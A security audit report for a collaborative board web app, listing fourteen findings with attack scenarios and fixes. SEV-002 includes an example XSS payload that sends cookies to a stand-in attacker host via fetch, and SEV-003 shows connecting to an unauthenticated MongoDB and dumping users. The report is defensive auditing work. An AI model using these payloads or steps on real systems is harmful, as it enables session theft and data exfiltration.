# CollabBoard — Security Audit Report

**Date:** 2026-06-10
**Auditor:** appsec-code-reviewer
**Scope:** Server-side code, auth flows, authorization, input validation, dependencies, infrastructure

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 3 |
| Medium   | 5 |
| Low      | 4 |
| Info     | 2 |
| **Total**| **14** |

The application has a solid security foundation: JWT secrets are properly separated and validated at startup, cookies are httpOnly with configurable secure/sameSite flags, all routes require authentication, Zod schemas enforce input length limits, and the board-scoped authorization middleware is applied consistently. The most significant issues are a missing refresh-token revocation store, HTML injection in email templates, an unauthenticated MongoDB instance exposed at the host level, and the absence of rate limiting outside the login/register endpoints.

---

## Findings

---

### [SEV-001] Refresh Token Not Invalidated on Logout — Severity: High

**File:** `server/src/routes/auth.ts:117-120`
**CWE:** CWE-613 (Insufficient Session Expiration)

**Description:**
`POST /auth/logout` calls `clearAuthCookies(res)` and returns 200. It does not record the presented refresh token as revoked anywhere. Because there is no server-side token store (no blacklist, no jti registry, no per-user token version), a refresh token captured before logout (from a log, a proxy, a shoulder-surf, or a stolen device) remains valid for its full 7-day TTL and can be used to issue new access tokens indefinitely.

**Attack Scenario:**
1. Attacker captures the victim's `refresh_token` cookie via any means (e.g., network intercept before HTTPS is enforced, access to browser dev-tools on a shared machine, or a previously logged session on a stolen device).
2. Victim clicks "Log out." The cookie is cleared from the victim's browser, but the token's cryptographic signature is still valid.
3. Attacker calls `POST /auth/refresh` with the captured cookie and receives a fresh `access_token` and `refresh_token`. They now have a fully working session that persists for up to 7 days with no further interaction.

**Impact:** Full account takeover persisting for up to 7 days after the victim logs out.

**Recommendation:**
Introduce a lightweight refresh-token nonce (jti) store. On `signRefreshToken`, embed a random UUID as the `jti` claim and persist `{ userId, jti, expiresAt }` to MongoDB (or Redis). On `POST /refresh`, verify the jti exists and has not been revoked before issuing new tokens. On `POST /logout`, delete the record. The collection stays small because expired documents can be TTL-indexed.

```typescript
// tokens.ts — add jti to payload and verify it against DB on refresh
import { randomUUID } from 'crypto';

export function signRefreshToken(payload: TokenPayload): { token: string; jti: string } {
  const jti = randomUUID();
  const token = jwt.sign({ ...payload, jti }, env.JWT_REFRESH_SECRET, {
    expiresIn: env.REFRESH_TOKEN_TTL as SignOptions['expiresIn'],
  });
  return { token, jti };
}
```

---

### [SEV-002] HTML Injection in Email Templates (Stored XSS via Email) — Severity: High

**File:** `server/src/lib/mail.ts:61-67`, `server/src/lib/mail.ts:92-100`
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Description:**
Both `sendBoardInvite` and `sendMentionNotification` construct HTML email bodies by interpolating user-controlled strings directly into an HTML template without HTML-escaping them. The affected fields are:

- `inviterName` — the inviting user's display name (set at registration, max 80 chars)
- `boardName` — the board name (set by any owner, max 120 chars)
- `toName` — the recipient's display name
- `mentionerName` — the mentioning user's display name
- `cardTitle` — the card title (set by any editor, max 280 chars)

Only `commentText` has partial escaping (`<` and `>` only), leaving `&`, `"`, `'`, and `/` unescaped — which is insufficient for attribute context injection.

**Attack Scenario:**
1. An attacker registers with the name `<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>` (fits within the 80-char max) or creates a board with a crafted name.
2. When the attacker invites another user to that board, the victim receives an HTML email containing the unescaped payload in the `<strong>` element.
3. If the victim's email client renders HTML (virtually all modern clients do), the script executes in the email client's rendering context. While cookies are not accessible from email contexts, the HTML injection can still be used for convincing phishing, credential harvesting forms, or tracking pixels.

**Impact:** HTML injection leading to phishing and social engineering of all invited/mentioned users; potential credential theft depending on email client capabilities.

**Recommendation:**
Add a minimal HTML-escaping helper and apply it to every user-supplied string before interpolation into HTML:

```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Usage in sendBoardInvite:
html: `
  <p>Hi ${escapeHtml(toName)},</p>
  <p><strong>${escapeHtml(inviterName)}</strong> has added you to the board
  <strong>&ldquo;${escapeHtml(boardName)}&rdquo;</strong> as a <em>${escapeHtml(role)}</em>.</p>
`,
```

Apply the same treatment to `mentionerName`, `cardTitle`, and `boardName` in `sendMentionNotification`.

---

### [SEV-003] MongoDB Exposed on Host Port 27017 Without Authentication — Severity: High

**File:** `docker-compose.yml:9-10`
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Description:**
The `docker-compose.yml` exposes MongoDB's port 27017 directly to the host network (`ports: - '27017:27017'`) with no `MONGO_INITDB_ROOT_USERNAME`, `MONGO_INITDB_ROOT_PASSWORD`, or any other authentication configuration. Any process on the host (and, in many deployment environments, any host on the same network segment) can connect directly to the database and read or write all application data, including password hashes, user PII, and board contents, without any credentials.

**Attack Scenario:**
1. Application is deployed to a cloud VM using this compose file.
2. Another tenant on the same physical host, or any attacker who can reach port 27017 via a misconfigured security group, runs `mongosh mongodb://<host-ip>:27017/collabboard` with no credentials.
3. Attacker dumps all users (`db.users.find()`) and obtains bcrypt hashes suitable for offline cracking, or directly modifies board membership to escalate themselves to owner.

**Impact:** Full database compromise — all user records, board data, comments, and password hashes exposed.

**Recommendation:**
1. Enable MongoDB authentication and remove the host-level port binding in docker-compose:

```yaml
mongo:
  image: mongo:7
  environment:
    MONGO_INITDB_ROOT_USERNAME: collabboard
    MONGO_INITDB_ROOT_PASSWORD_FILE: /run/secrets/mongo_password
  # Remove the ports: block — app container reaches mongo by service name
```

2. Update `MONGODB_URI` to include credentials: `mongodb://collabboard:<pass>@mongo:27017/collabboard`.
3. If the port must be published for local development, bind only to loopback: `127.0.0.1:27017:27017`.

---

### [SEV-004] No Rate Limiting on Board Creation — Resource Exhaustion — Severity: Medium

**File:** `server/src/routes/boards.ts:59-77`
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

**Description:**
`POST /boards` is authenticated but has no rate limit. An authenticated attacker can create boards in a tight loop, causing unbounded document growth in MongoDB. There is also no per-user board count cap enforced in the route. The same applies to `POST /boards/:id/members` (invite endpoint) and comment creation.

**Attack Scenario:**
An attacker authenticates and scripts a loop calling `POST /boards` thousands of times per minute. MongoDB disk and memory consumption grow without bound, eventually degrading or crashing the service for all users.

**Impact:** Denial of service; disk exhaustion; MongoDB performance degradation.

**Recommendation:**
Apply a rate limiter to mutation endpoints. Reuse the existing `express-rate-limit` dependency already imported in `auth.ts`:

```typescript
// In app.ts or a shared middleware file
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,           // 60 write operations per user per minute
  keyGenerator: (req) => req.user?.id ?? req.ip,
  skip: () => isTest,
});

boardsRouter.use(apiLimiter);
```

Additionally consider a per-user board cap enforced with a `countDocuments` guard before creation.

---

### [SEV-005] Assignees Not Validated as Board Members — Severity: Medium

**File:** `server/src/routes/cards.ts:130-131`, `server/src/schemas/card.ts:19`
**CWE:** CWE-284 (Improper Access Control)

**Description:**
The `PATCH /boards/:id/cards/:cardId` endpoint accepts an `assignees` array of user ObjectIds (validated as valid ObjectId format by Zod, capped at 50). However, there is no check that the provided user IDs are actually members of the board. An editor can assign any user in the entire system — including users who have no board membership and whose email they may not know — to a card.

**Attack Scenario:**
1. Attacker (an editor on Board A) wants to discover whether user ID `X` (gleaned from any other API response) is registered in the system.
2. They call `PATCH /boards/boardA/cards/someCard` with `{ "assignees": ["<X>"] }`.
3. The update succeeds silently regardless of whether `X` is a real user. While this does not directly expose data, it enables information leakage about user existence through observing Socket.io events broadcast to the board room.
4. More critically, board owners who later retrieve the card see a non-member referenced as an assignee, creating confusion about access boundaries.

**Impact:** Potential user enumeration and confusion of access control model; information leakage via assignee cross-referencing.

**Recommendation:**
Before saving, validate that all provided assignee IDs exist in `board.members`:

```typescript
if (body.assignees !== undefined) {
  const memberIds = new Set(req.board!.members.map((m) => String(m.user)));
  const invalid = body.assignees.filter((id) => !memberIds.has(String(id)));
  if (invalid.length > 0) {
    throw new HttpError(400, 'Assignees must be board members');
  }
  card.set('assignees', body.assignees);
}
```

---

### [SEV-006] Missing Rate Limiting on `/auth/refresh` — Brute-Force Token Rotation — Severity: Medium

**File:** `server/src/routes/auth.ts:100-115`
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Description:**
`POST /auth/refresh` has no rate limiter applied. It validates the refresh token's cryptographic signature, which is computationally cheap to check, but the endpoint also rotates tokens — so a mass of crafted requests could be used to probe for valid refresh tokens (timing side-channels) or to overwhelm the signing/verification pipeline. Combined with the absence of token revocation (SEV-001), this represents an unbounded attack surface.

**Impact:** Amplified risk when combined with SEV-001; enables high-volume probing of stolen tokens.

**Recommendation:**
Apply `authLimiter` (already defined in the same file) to the refresh endpoint:

```typescript
authRouter.post('/refresh', authLimiter, (req, res, next) => { ... });
```

---

### [SEV-007] Hardcoded `http://localhost:5173` URLs in Email Templates — Severity: Medium

**File:** `server/src/lib/mail.ts:58`, `server/src/lib/mail.ts:65`
**CWE:** CWE-547 (Use of Hard-coded, Security-relevant Constants)

**Description:**
The email bodies contain hardcoded `http://localhost:5173` as the application URL. In production this link will point to localhost on the email recipient's own machine — not to the deployed service — making invite emails non-functional. More critically, if the application URL were ever changed to a different scheme or host, the link in emails would remain unchanged and potentially point to an unrelated or attacker-controlled service.

**Impact:** Broken invite/mention functionality in production; potential for link hijacking if a future refactor changes the domain without updating this hardcoded value.

**Recommendation:**
Add an `APP_URL` environment variable and reference it in the email templates:

```typescript
// env.ts
APP_URL: z.string().url().default('http://localhost:5173'),

// mail.ts
`<a href="${env.APP_URL}">Sign in to CollabBoard</a>`
```

---

### [SEV-008] Unbounded Comment and Card Listing — Potential DoS — Severity: Medium

**File:** `server/src/routes/comments.ts:43-45`, `server/src/routes/cards.ts:44-46`, `server/src/routes/lists.ts:34-36`
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

**Description:**
`GET /boards/:id/cards`, `GET /boards/:id/lists`, and `GET /boards/:id/cards/:cardId/comments` all execute unbounded `find()` queries with no `limit()` clause. (The activity log at `GET .../activity` correctly caps at 100.) If a board accumulates thousands of cards or comments, a single request causes MongoDB to stream the entire collection, consuming significant memory and CPU on both the database and Node.js process.

**Impact:** Degraded performance for all users; potential out-of-memory crash on large boards.

**Recommendation:**
Add `.limit()` to all unbounded `find()` calls and implement cursor-based or offset pagination. As a stopgap, add a hard cap:

```typescript
const cards = await CardModel.find({ board: req.board?.id })
  .sort({ position: 1, createdAt: 1 })
  .limit(500)
  .exec();
```

---

### [SEV-009] `docker-compose.yml` Missing JWT Secrets and COOKIE_SECURE in Production Config — Severity: Low

**File:** `docker-compose.yml:26-35`
**CWE:** CWE-665 (Improper Initialization)

**Description:**
The `docker-compose.yml` sets `NODE_ENV: production` for the server service but does not set `JWT_ACCESS_SECRET`, `JWT_REFRESH_SECRET`, or `COOKIE_SECURE`. Because the `env.ts` startup guard only checks for the literal string `change-me`, if an operator copies this compose file and supplies *any* secret — including a short or weak one — the guard passes. Additionally `COOKIE_SECURE` is not set, so it defaults to `false`, meaning cookies will be sent over plain HTTP in a production-labelled deployment.

**Impact:** Risk of cookie theft over unencrypted connections in production environments that use this compose file as a starting point.

**Recommendation:**
Add placeholder comments forcing the operator to supply secrets, and set `COOKIE_SECURE: 'true'` by default in production:

```yaml
environment:
  NODE_ENV: production
  COOKIE_SECURE: 'true'
  COOKIE_SAMESITE: lax
  # REQUIRED — supply via Docker secrets or .env file:
  # JWT_ACCESS_SECRET:
  # JWT_REFRESH_SECRET:
```

---

### [SEV-010] Socket.io `board:join` Accepts Unvalidated `boardId` String — Severity: Low

**File:** `server/src/lib/socket.ts:62-82`
**CWE:** CWE-20 (Improper Input Validation)

**Description:**
The `board:join` event handler receives a raw `boardId: string` from the client with no ObjectId format validation before passing it to `BoardModel.findById(boardId)`. Mongoose's `findById` will cast the value and return null for invalid ObjectIds, so no query injection is possible. However, a client can send arbitrarily crafted strings (e.g., extremely long strings, object-like strings) that create entries in the `presence` Map with garbage keys before `findById` returns null and the handler exits, because the `findById` call returns `null` before any presence entry is made. The current flow is:

1. `BoardModel.findById(boardId)` — if null, return early ✓
2. Membership check — if fails, return early ✓
3. `socket.join(...)` — only reached after validation ✓

The risk is minimal but the absence of explicit format validation is a defensive gap. If the logic order were ever changed, the gap becomes exploitable.

**Impact:** Low current risk; future regression risk.

**Recommendation:**
Add an `isValidObjectId` guard at the top of the handler, consistent with the REST route pattern:

```typescript
socket.on('board:join', async (boardId: string) => {
  if (!boardId || !isValidObjectId(boardId)) return;
  // ...
});
```

---

### [SEV-011] CI Pipeline Lacks `npm audit` Step — Severity: Low

**File:** `.github/workflows/ci.yml`
**CWE:** CWE-1104 (Use of Unmaintained Third-Party Components)

**Description:**
The CI workflow runs lint, typecheck, tests, and builds, but does not run `npm audit` or any equivalent dependency vulnerability scan. New vulnerabilities in transitive dependencies will not be caught before merging to main. As demonstrated by the current audit results (2 critical, 4 moderate in vitest/vite/esbuild), this can accumulate undetected.

**Impact:** Vulnerable dependencies may ship undetected.

**Recommendation:**
Add an audit step to the workflow, scoped to production dependencies:

```yaml
- name: Security audit (production deps)
  run: npm audit --audit-level=high --omit=dev
```

---

### [SEV-012] Health Endpoint Discloses Application Version Unauthenticated — Severity: Low

**File:** `server/src/routes/health.ts:24-31`
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

**Description:**
`GET /health` is unauthenticated and returns the application version string (`npm_package_version`). This is a standard practice for liveness probes but should be noted: the version string assists attackers in fingerprinting the running software and targeting known CVEs for that specific version. The endpoint also returns the database connection state.

**Impact:** Minor version disclosure aids targeted attack planning.

**Recommendation:**
For production, either restrict version disclosure to an internal/VPC-only network path, or strip the `version` field from the public liveness response and expose it only on the readiness probe behind a management network.

---

### [SEV-013] No `npm audit` in CI (Client Dependencies) — Severity: Informational

**File:** `.github/workflows/ci.yml`, `package-lock.json`

**Description:**
The root-level `npm audit` reports 6 vulnerabilities across the workspace (4 moderate, 2 critical), all in vitest/vite/esbuild. These are **dev-only / test tooling** dependencies and are not included in the production server or client bundles. The esbuild advisory (GHSA-67mh-4wv8-2f99) affects the vite development server — it allows external websites to proxy requests through the dev server. This is not a production risk but is a risk during development if the dev server is exposed on a non-loopback interface.

**Impact:** No current production risk; development environment exposure if `vite` dev server is accessible remotely.

**Recommendation:**
Update vitest and vite to versions that resolve these advisories (`npm audit fix --force` requires major version bumps — evaluate compatibility first). Ensure the vite dev server is never bound to `0.0.0.0` in developer environments.

---

### [SEV-014] `commentText` Partial HTML Escaping Insufficient for All Injection Contexts — Severity: Informational

**File:** `server/src/lib/mail.ts:98`

**Description:**
`sendMentionNotification` escapes `<` and `>` in `commentText` before embedding it in the email HTML `<blockquote>`. This prevents tag injection but does not escape `&` (which can break HTML entity rendering), `"` (which can break attribute values if ever used in an attribute context), or `'`. The current usage inside a block element is safe from attribute injection, but the partial escaping is not a robust pattern.

**Impact:** No immediate exploit; risk increases if the template is modified to use `commentText` in an attribute context.

**Recommendation:**
Use the full `escapeHtml` function recommended in SEV-002 rather than the ad hoc `replace` chain, making the escaping robust regardless of template context changes.

---

## npm audit Output

```
# npm audit report

esbuild  <=0.24.2
Severity: moderate
esbuild enables any website to send any requests to the development server and read the response
https://github.com/advisories/GHSA-67mh-4wv8-2f99
fix available via `npm audit fix --force`
Will install vite@8.0.16, which is a breaking change
node_modules/vite/node_modules/esbuild
  vite  <=6.4.1
  Depends on vulnerable versions of esbuild
  node_modules/vite
    @vitest/mocker  <=3.0.0-beta.4
    Depends on vulnerable versions of vite
    node_modules/@vitest/mocker
      vitest  <=3.2.5
      Depends on vulnerable versions of @vitest/mocker
      Depends on vulnerable versions of vite
      Depends on vulnerable versions of vite-node
      node_modules/vitest
        @vitest/coverage-v8  <=3.2.5
        Depends on vulnerable versions of vitest
        server/node_modules/@vitest/coverage-v8
    vite-node  <=2.2.0-beta.2
    Depends on vulnerable versions of vite
    node_modules/vite-node

6 vulnerabilities (4 moderate, 2 critical)

To address all issues (including breaking changes), run:
  npm audit fix --force

Note: All 6 vulnerabilities are in dev/test tooling (vitest/vite/esbuild).
No production runtime dependencies have known CVEs.
```

---

## Passing Controls

The following areas were reviewed and found to be correctly implemented:

- **JWT algorithm confusion prevented:** `jsonwebtoken` v9 `verify()` is called with a secret string (not a public key), which enforces HS256 and rejects alg:none and RS256→HS256 confusion attacks.
- **Access and refresh secrets are separate:** `JWT_ACCESS_SECRET` and `JWT_REFRESH_SECRET` are distinct environment variables with distinct signing and verification functions. A compromised access token cannot be used to forge a refresh token.
- **Default secrets blocked in production:** `env.ts` calls `process.exit(1)` at startup if either JWT secret contains `change-me` when `NODE_ENV=production`.
- **Password hash never returned by default:** `passwordHash` is `select: false` in the User schema and is explicitly deleted in the `toJSON` transform. The `login` route correctly re-selects it only for verification.
- **Bcrypt used correctly:** `bcryptjs.compare` provides constant-time comparison. The cost factor is configurable (default 12) within a sensible 8–15 range.
- **httpOnly cookies with configurable secure/sameSite:** Both access and refresh cookies are `httpOnly: true`; `secure` and `sameSite` are driven by environment variables. Cookie options are identical between set and clear operations, preventing clearing failures.
- **CORS restricted to configured origins:** Both Express CORS and Socket.io CORS use `env.CORS_ORIGIN` (a validated, explicit list), not `*`.
- **All board routes require authentication:** `boardsRouter.use(requireAuth)` is applied before all subrouters and route handlers. No board, list, card, or comment endpoint is reachable without a valid access token.
- **Authorization applied before every sub-resource operation:** Every list, card, and comment operation calls `requireBoardRole(...)` which re-loads and re-validates board membership from the database on each request. There is no client-side trust of previously established roles.
- **IDOR prevented on cards, lists, comments:** All database queries include both the resource ID and the board ID (e.g., `CardModel.findOne({ _id: cardId, board: req.board?.id })`), preventing cross-board resource access even with a valid board membership elsewhere.
- **Non-members receive 404, not 403:** `requireBoardRole` returns 404 for non-members, preventing board existence enumeration by outsiders.
- **Owner self-removal and role change prevented:** The boards route explicitly blocks removing or changing the role of the board owner.
- **Input validation via Zod on all request bodies:** `validateBody()` is applied to every mutating endpoint; the parsed (coerced) data replaces `req.body` before handlers run, preventing prototype pollution via extra keys.
- **ObjectId validation on all path parameters:** All route handlers call `isValidObjectId()` before using path parameters in database queries.
- **Socket.io authentication on WS upgrade:** The Socket.io middleware verifies the access token from the cookie or `auth.token` before allowing the connection to proceed. Unauthenticated upgrade attempts receive `Unauthorized`.
- **Board membership re-checked on `board:join`:** The socket handler fetches the board from the database and checks membership before admitting the socket to the board room, preventing non-members from receiving real-time events.
- **Helmet enabled with defaults:** `app.use(helmet())` applies a sensible baseline of security headers (X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, HSTS, Referrer-Policy).
- **Swagger UI disabled in production:** The `/api-docs` endpoint is only mounted when `!isProduction`, reducing attack surface exposure.
- **Error messages sanitized in production:** The error handler returns `"Internal Server Error"` for 5xx responses in production, not the raw error message or stack trace.
- **Structured logging with Pino:** Logs are structured JSON in production with no observed logging of password, token, or other sensitive values.
- **Multi-stage Dockerfile with non-root user:** The server Dockerfile uses a three-stage build (builder, deps, runner), copies only compiled output and production dependencies, and runs as the unprivileged `node` user.
- **Authentication rate limiting on login and register:** `authLimiter` (30 requests per 15 minutes) is applied to both `POST /auth/login` and `POST /auth/register`, with consistent `"Invalid credentials"` error messages for both wrong email and wrong password (preventing user enumeration timing differences are covered by bcrypt's constant-time comparison).

---

## Recommended Next Steps

**Immediate (before production deployment):**

1. **[SEV-003]** Remove the `27017:27017` host port binding from `docker-compose.yml` and enable MongoDB authentication. This is the only finding that can result in full database compromise without requiring a valid application credential.
2. **[SEV-001]** Implement refresh token revocation via a MongoDB TTL-indexed `refresh_tokens` collection. Without this, logout does not provide meaningful session termination.

**Before next release:**

3. **[SEV-002]** Add `escapeHtml()` to all user-supplied strings in email templates (`inviterName`, `boardName`, `toName`, `mentionerName`, `cardTitle`).
4. **[SEV-009]** Update `docker-compose.yml` to set `COOKIE_SECURE: 'true'` and add explicit placeholders for required JWT secrets.
5. **[SEV-006]** Apply `authLimiter` to `POST /auth/refresh`.

**Within sprint:**

6. **[SEV-004]** Add rate limiting to `POST /boards`, `POST /boards/:id/members`, and `POST /boards/:id/cards/:cardId/comments`.
7. **[SEV-005]** Validate `assignees` against the board's current member list before saving.
8. **[SEV-007]** Introduce `APP_URL` environment variable and replace hardcoded `localhost` URLs in mail templates.
9. **[SEV-008]** Add `.limit()` caps to unbounded `find()` queries in cards, lists, and comments routes.
10. **[SEV-011]** Add `npm audit --audit-level=high --omit=dev` step to CI.

**When feasible:**

11. **[SEV-010]** Add `isValidObjectId` guard at the top of the socket `board:join` handler.
12. **[SEV-012]** Suppress `version` from the public health endpoint in production.
13. **[SEV-013]** Update vitest/vite to resolve esbuild advisory in dev toolchain.
14. **[SEV-014]** Replace partial `commentText` escaping with a proper `escapeHtml()` function.
